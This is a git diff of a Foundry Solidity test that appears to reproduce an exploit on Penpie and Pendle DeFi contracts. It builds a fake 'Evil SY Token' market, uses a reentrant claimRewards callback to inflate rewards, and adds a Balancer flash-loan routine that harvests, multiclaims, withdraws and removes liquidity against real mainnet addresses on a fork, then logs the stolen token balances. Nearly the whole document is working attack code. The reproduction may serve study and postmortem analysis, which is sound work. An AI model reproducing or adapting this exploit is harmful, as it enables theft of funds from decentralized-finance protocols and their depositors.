@@ -14,6 +14,11 @@ import "../src/interfaces/pendle/PendleStaking.sol";
 import "../src/interfaces/pendle/PendleMarketFactoryV3.sol";
 
 
+import "../src/interfaces/penpie/MasterPenpie.sol";
+
+import "../src/interfaces/balancer/BalancerVault.sol";
+
+
 contract AttackingContract is Test {
     string public name = 'Evil SY Token'; // These params don't really matter
     string public symbol = 'EVIL';
@@ -48,21 +53,25 @@ contract AttackingContract is Test {
         }
     }
 
+    address agETH = 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e;
+    address pendleAgEthSy = 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe;
+
+    address rswETH = 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0;
+    address pendleRswEthSy = 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6;
+
+    address pendleRouterV4 = 0x888888888889758F76e7103c6CbF23ABbF58F946;
+
+    address balancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+
     uint256 claimRewardsCall;
+    uint256 pendleAgEthSy_balance;
     uint256 netLpOut_fromRouter;
+
     function claimRewards(address user) external returns (uint256[] memory rewardAmounts) {
         if (claimRewardsCall == 0) {
             claimRewardsCall++;
             return new uint256[](0);
         }
-
-        address agETH = 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e;
-        address pendleAgEthSy = 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe;
-
-        address rswETH = 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0;
-        address pendleRswEthSy = 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6;
-
-        address pendleRouterV4 = 0x888888888889758F76e7103c6CbF23ABbF58F946;
 
         if (claimRewardsCall == 1) {
             // Approves PendleRouterV4 contract to move its whole agETH balance
@@ -93,7 +102,7 @@ contract AttackingContract is Test {
             }
 
             // Approves PendleStaking contract to move its whole agETH SY balance
-            uint256 pendleAgEthSy_balance = IERC20(pendleAgEthSy).balanceOf(address(this));
+            pendleAgEthSy_balance = IERC20(pendleAgEthSy).balanceOf(address(this));
             IERC20(pendleAgEthSy).approve(0x6E799758CEE75DAe3d84e09D40dc416eCf713652, pendleAgEthSy_balance);
             // and deposits it all into the real Pendle agETH Market
             PendleMarketDepositHelper(0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4).depositMarket(pendleAgEthSy, pendleAgEthSy_balance);
@@ -135,6 +144,8 @@ contract AttackingContract is Test {
         }
     }
 
+    address LPT;
+
     function test_createEvilPendleMarket() external {
         // Exploiter creates a Principal Token and a Yield Token on Pendle
         // using his evil Standard Yield token.
@@ -173,7 +184,7 @@ contract AttackingContract is Test {
         // and it makes sense because 0xe024a18206767e29984a468924e2d318334C9830
         // turns out to be the address of the Principal Token generated in the previous call
         // the rest of the params just need to be decoded as int256, int256 and uint80 respectively
-        address LPT = PendleMarketFactoryV3(0x6fcf753f2C67b83f7B09746Bbc4FA0047b35D050)
+        LPT = PendleMarketFactoryV3(0x6fcf753f2C67b83f7B09746Bbc4FA0047b35D050)
             .createNewMarket(
                 PT,
                 23352202321000000000,
@@ -233,5 +244,134 @@ contract AttackingContract is Test {
         // 0x5b6c23aedf704d19d6d8e921e638e8ae03cdca82 (evil Market / LPT)
         // 0x0de0b6b3a763fc18 = 0x0de0b6b3a7640000 - 1000 = 999999999999999000
         PendleMarketDepositHelper(0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4).depositMarket(LPT, 999999999999999000);
+    }
+
+    uint256 agETH_balancerVault_balance;
+    uint256 rswETH_balancerVault_balance;
+
+    function receiveFlashLoan(
+        address[] memory tokens,
+        uint256[] memory amounts,
+        uint256[] memory feeAmounts,
+        bytes memory userData
+    ) external {
+        address[] memory _markets = new address[](1);
+        _markets[0] = LPT;
+        PendleStaking(0x6E799758CEE75DAe3d84e09D40dc416eCf713652).batchHarvestMarketRewards(
+            _markets,
+            0
+        );
+
+        MasterPenpie(0x16296859C15289731521F199F0a5f762dF6347d0).multiclaim(_markets);
+        PendleMarketDepositHelper(0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4).withdrawMarket(pendleAgEthSy, pendleAgEthSy_balance);
+        uint256 bal_this = IERC20(pendleAgEthSy).balanceOf(address(this));
+
+        IERC20(pendleAgEthSy).approve(pendleRouterV4, bal_this);
+
+        {
+            PendleRouterV4.LimitOrderData memory limit = PendleRouterV4.LimitOrderData(
+                address(0),// address limitRouter;
+                0,// uint256 epsSkipMarket; // only used for swap operations, will be ignored otherwise
+                new PendleRouterV4.FillOrderParams[](0),// FillOrderParams[] normalFills;
+                new PendleRouterV4.FillOrderParams[](0),// FillOrderParams[] flashFills;
+                ''// bytes optData;
+            );
+
+            PendleRouterV4.SwapData memory swapData = PendleRouterV4.SwapData(
+                PendleRouterV4.SwapType.NONE,// SwapType swapType;
+                address(0),// address extRouter;
+                "",// bytes extCalldata;
+                false// bool needScale;
+            );
+
+            PendleRouterV4.TokenOutput memory output = PendleRouterV4.TokenOutput(
+                agETH,//address tokenOut;
+                0,//uint256 minTokenOut;
+                agETH,//address tokenRedeemSy;
+                address(0),//address pendleSwap;
+                swapData//SwapData swapData;
+            );
+
+            PendleRouterV4(pendleRouterV4).removeLiquiditySingleToken(
+                address(this),//address receiver,
+                pendleAgEthSy,//address market,
+                bal_this,//uint256 netLpToRemove,
+                output,//TokenOutput calldata output,
+                limit//LimitOrderData calldata limit
+            );
+        }
+
+        PendleMarketDepositHelper(0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4).withdrawMarket(pendleAgEthSy, netLpOut_fromRouter);
+
+        pendleAgEthSy_balance = IERC20(pendleAgEthSy).balanceOf(address(this));
+        IERC20(pendleAgEthSy).approve(pendleRouterV4, pendleAgEthSy_balance);
+
+        {
+            PendleRouterV4.LimitOrderData memory limit = PendleRouterV4.LimitOrderData(
+                address(0),// address limitRouter;
+                0,// uint256 epsSkipMarket; // only used for swap operations, will be ignored otherwise
+                new PendleRouterV4.FillOrderParams[](0),// FillOrderParams[] normalFills;
+                new PendleRouterV4.FillOrderParams[](0),// FillOrderParams[] flashFills;
+                ''// bytes optData;
+            );
+
+            PendleRouterV4.SwapData memory swapData = PendleRouterV4.SwapData(
+                PendleRouterV4.SwapType.NONE,// SwapType swapType;
+                address(0),// address extRouter;
+                "",// bytes extCalldata;
+                false// bool needScale;
+            );
+
+            PendleRouterV4.TokenOutput memory output = PendleRouterV4.TokenOutput(
+                rswETH,//address tokenOut;
+                0,//uint256 minTokenOut;
+                rswETH,//address tokenRedeemSy;
+                address(0),//address pendleSwap;
+                swapData//SwapData swapData;
+            );
+
+            PendleRouterV4(pendleRouterV4).removeLiquiditySingleToken(
+                address(this),//address receiver,
+                pendleAgEthSy,//address market,
+                pendleAgEthSy_balance,//uint256 netLpToRemove,
+                output,//TokenOutput calldata output,
+                limit//LimitOrderData calldata limit
+            );
+        }
+
+        IERC20(agETH).balanceOf(address(this));
+        IERC20(agETH).transfer(balancerVault, agETH_balancerVault_balance);
+        IERC20(rswETH).balanceOf(address(this));
+        IERC20(rswETH).transfer(balancerVault, rswETH_balancerVault_balance);
+    }
+
+    function executeAttack() external {
+        address[] memory tokens = new address[](2);
+        tokens[0] = agETH;
+        tokens[1] = rswETH;
+        uint256[] memory amounts = new uint256[](2);
+        agETH_balancerVault_balance = IERC20(agETH).balanceOf(balancerVault);
+        amounts[0] = agETH_balancerVault_balance;
+        rswETH_balancerVault_balance = IERC20(rswETH).balanceOf(balancerVault);
+        amounts[1] = rswETH_balancerVault_balance;
+        BalancerVault(balancerVault).flashLoan(
+            address(this),
+            tokens,
+            amounts,
+            ''
+        );
+    }
+
+    function setUp() public {
+        vm.createSelectFork("https://rpc.flashbots.net", 20671877);
+        this.test_createEvilPendleMarket();
+        vm.roll(block.number + 1);
+    }
+
+    function test_completePenpieAttack() public {
+        this.executeAttack();
+
+        console.log('Final balance in agETH :', IERC20(agETH).balanceOf(address(this)));
+        console.log('Final balance in rswETH:', IERC20(rswETH).balanceOf(address(this)));
     }
 }
